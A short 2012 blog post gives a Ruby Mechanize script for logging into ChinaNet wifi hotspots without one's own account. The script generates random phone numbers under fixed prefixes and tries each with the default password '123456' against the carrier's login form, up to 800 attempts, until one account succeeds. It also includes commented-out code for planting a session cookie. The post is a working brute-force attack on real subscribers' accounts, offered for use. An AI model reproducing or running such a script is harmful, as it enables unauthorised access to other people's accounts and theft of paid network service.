---
layout: post
title: 'Login ChinaNet hotspot without number'
date: 2012-04-08 19:44
comments: true
categories: tech
---

hi,guys.maybe there ChinaNet hotspot surround u.but u dont have a proper number and password to login.
so i write a script via ruby which could enumerate phone numbers.
absolutely password is 123456.damn.

## Ok,Here We Go

Steps
------------------
1. install Ruby & Rubygem
2. install mechanize via rubygem
3. run the script

btw,i have to say,u could edit the phone number as u want.And before run the script,u must assure that uve connected to wireless hotspot ChinaNet(means that uve got a proper ip addr).


Script
-------------------
``` ruby
require 'rubygems'
require 'mechanize'
require 'logger'

puts "1.Start with 180640"
puts "2.Start with 189909"
puts "3.Start with 153497"
input = gets.chomp

if input == "1"
	gennum = lambda {return "180640" + Random.new.rand(11111...99999).to_s }	
elsif input == "2"
	gennum = lambda {return "189909" + Random.new.rand(11111...99999).to_s }	
elsif input == "3"
	gennum = lambda {return "153497" + Random.new.rand(11111...99999).to_s }		
end
	
puts "Starting"
MATH_CLASSES_URL = "http://wlan.ct10000.com/login.jsp"
agent = Mechanize.new
agent.log = Logger.new "mech.log"
agent.user_agent = "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.77 Safari/535.7"
#agent.keep_alive = true

puts "Getting page"
page = agent.get MATH_CLASSES_URL
puts "Configuring FORM"
form = page.form("theForm")

800.times do |time|
	number = gennum.call
	puts "##########Current Number:#{number}-----------#{time}"
	form.field_with(:name => "loginpage").value = "main_cn"
	form.field_with(:name => "useragent").value = "pc"
	form.field_with(:name => "loginvalue").value = "1"
	form.field_with(:name => "username").value = number
	form.field_with(:name => "passwd").value = "123456"
	ret = agent.submit form
	unless ret.title.include?("Error Information")
		puts "OK,Logon,Here U Go-------------------------------#{number}"		
		break;
	end	
	p ret
end
#cookie = Mechanize::Cookie.new("JSESSIONID", "P5nBLMHp9RJvWgSNFKc0B1NJF92541yC94Qlcj6hLSdn3KTnLrbP!1108952281")
#cookie.domain = ".ct10000.com"
#cookie.path = "/"
#agent.cookie_jar.add!(cookie)

```

